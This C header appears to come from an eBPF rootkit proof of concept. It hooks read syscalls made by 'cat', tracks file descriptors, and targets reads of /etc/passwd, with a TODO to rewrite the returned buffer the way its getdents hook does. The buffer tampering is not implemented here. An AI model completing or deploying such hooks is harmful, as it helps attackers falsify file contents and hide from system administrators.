/**
 * POC : trying to hook read returns based on dedicated files.
 * 
 * @author Yekuuun
 */

#ifndef MOD_HOOK_READ_H
#define MOD_HOOK_READ_H

#include "../includes/bpf_config.h"
#include "../includes/bpf_common.h"
#include "../includes/bpf_structs.h"
#include "../includes/bpf_debug.h"
#include "../includes/bpf_events_handler.h"
#include "../data/bpf_events.h"
#include "../data/bpf_ringbuf.h"
#include "../lib/ftlib.h"

/**
 * Hook sys_enter_read.
 */
SEC("tp/syscalls/sys_enter_read")
int tp_sys_enter_read(struct sys_enter_read_ctx *ctx)
{
    if(!ctx)
        return 0;

    if(!__is_target_bin() || !__is_binary_cat())
        return 0;

    __u64 fd = ctx->fd; 

    __u64 pid_tgid = bpf_get_current_pid_tgid(); //64 bits value returned.

    //detect correct cat call. (look into map.)
    struct fd_key key = {
        .fd = fd,
        .pid_tgid = pid_tgid
    };

    char* target = bpf_map_lookup_elem(&fd_to_path_cache, &key);
    if(!target)
        return 0;

    char target_val[MAX_PATH] = {0};
    if(bpf_probe_read_kernel_str(target_val, sizeof(target_val), target) < 0){
        PRINT_DEBUG("Error retrieving value from map cache.");
        return 0;
    }

    PRINT_DEBUG("  Found call for filepath : %s. Storing cache value for exit...", target_val);
    bpf_map_update_elem(&read_cache, &pid_tgid, &fd, BPF_ANY);

    //clean.
    return 0;
}

/**
 * Hook sys_exit_read.
 */
SEC("tp/syscalls/sys_exit_read")
int tp_sys_exit_read(struct sys_exit_read_ctx *ctx)
{
    if(!ctx)
        return 0;

    if(!__is_target_bin() || !__is_binary_cat())
        return 0;

    __u64 pid_tgid = bpf_get_current_pid_tgid(); //64 bits value returned.

    __u64 *fd = bpf_map_lookup_elem(&read_cache, &pid_tgid);
    if(!fd) {
        //silence.
        return 0;
    }

    PRINT_DEBUG("   Entry of sys_exit_read => resolved fd => %ld", *fd);

    //retrieve filename
    struct fd_key key = {
        .fd = *fd,
        .pid_tgid = pid_tgid
    };

    char* target = bpf_map_lookup_elem(&fd_to_path_cache, &key);
    if(!target)
        return 0;

    char target_val[MAX_PATH] = {0};
    if(bpf_probe_read_kernel_str(target_val, sizeof(target_val), target) < 0){
        PRINT_DEBUG("   Error retrieving value from map cache.");
        goto __END;
    }

    PRINT_DEBUG("   Retrieved filename in sys_exit_read => %s", target_val);

    //only keep passwd for testing.
    if(ft_strstr(target_val, "passwd") == NULL){
        PRINT_DEBUG("   NOT /etc/passwd ???? WHUUUUUUUUUUUT");
        goto __END;
    }
    
    /**
     * TO DO : 
     * 
     * Handling : char __user * buf (update maps to store raw ptr & use same technique as getdents)
     */

__END: 
    PRINT_DEBUG("   Cleaning maps...");
    bpf_map_delete_elem(&read_cache, &pid_tgid);
    bpf_map_delete_elem(&read_cache, &key);

    return 0;
}

#endif